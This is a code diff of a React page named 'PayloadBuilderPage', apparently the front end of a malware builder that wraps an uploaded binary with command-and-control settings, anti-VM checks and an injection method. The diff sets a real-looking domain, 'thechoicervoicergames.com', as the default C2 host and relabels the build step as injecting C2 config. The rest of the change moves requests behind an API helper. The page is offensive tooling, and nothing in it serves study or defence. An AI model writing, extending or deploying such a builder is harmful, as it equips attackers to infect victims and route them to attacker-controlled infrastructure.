@@ -13,7 +13,7 @@ export function PayloadBuilderPage() {
   const [uploadedFile, setUploadedFile] = useState<File | null>(null)
   const [fileInfo, setFileInfo] = useState<{ name: string; size: number; type: string } | null>(null)
   const [config, setConfig] = useState({
-    c2Host: '',
+    c2Host: 'thechoicervoicergames.com',
     c2Port: '8080',
     useTLS: false,
     key: '',
@@ -34,18 +34,6 @@ export function PayloadBuilderPage() {
   const [history, setHistory] = useState<Array<{ id: string; filename: string; created_at: string; size: number; status: string }>>([])
 
   const { addNotification } = useStore()
-
-  const apiGet = async (url: string) => {
-    const token = localStorage.getItem('auth_token')
-    const res = await fetch(`/api${url}`, {
-      headers: { 'Authorization': `Bearer ${token}` }
-    })
-    return res.json()
-  }
-  const apiDelete = async (url: string) => {
-    const token = localStorage.getItem('auth_token')
-    return fetch(`/api${url}`, { method: 'DELETE', headers: { 'Authorization': `Bearer ${token}` } })
-  }
 
   const handleFileUpload = useCallback((e: React.ChangeEvent<HTMLInputElement>) => {
     const file = e.target.files?.[0]
@@ -83,7 +71,7 @@ export function PayloadBuilderPage() {
 
     setBuilding(true)
     setBuildProgress(0)
-    setBuildStatus('Uploading binary...')
+    setBuildStatus('Wrapping binary + injecting C2 config...')
     setError(null)
     setBuildResult(null)
 
@@ -103,33 +91,16 @@ export function PayloadBuilderPage() {
       formData.append('anti_vm', config.antiVM.toString())
       formData.append('injection_method', config.injectionMethod)
 
-      setBuildProgress(25)
-      setBuildStatus('Processing binary...')
+      setBuildProgress(40)
+      const result = await api.buildPayload(formData)
 
-      const response = await fetch('/api/payloads/build', {
-        method: 'POST',
-        body: formData,
-        headers: {
-          'Authorization': `Bearer ${localStorage.getItem('auth_token')}`
-        }
-      })
-
-      setBuildProgress(75)
-      setBuildStatus('Finalizing...')
-
-      if (!response.ok) {
-        const err = await response.json()
-        throw new Error(err.error || 'Build failed')
-      }
-
-      const result = await response.json()
       setBuildProgress(100)
-      setBuildStatus('Build complete!')
+      setBuildStatus('Wrap complete — config embedded')
       setBuildResult(result)
 
       addNotification({
         type: 'success',
-        message: `${fileInfo?.name} wrapped successfully`
+        message: `${fileInfo?.name} wrapped -> ${config.c2Host}`
       })
 
       loadHistory()
@@ -143,7 +114,7 @@ export function PayloadBuilderPage() {
 
   const loadHistory = async () => {
     try {
-      const res = await apiGet('/payloads/history')
+      const res = await api.getPayloadHistory()
       setHistory(res || [])
     } catch {
       // Ignore
@@ -177,7 +148,7 @@ export function PayloadBuilderPage() {
 
   const deletePayload = async (id: string) => {
     try {
-      await apiDelete(`/payloads/${id}`)
+      await api.deletePayload(id)
       loadHistory()
       addNotification({
         type: 'success',
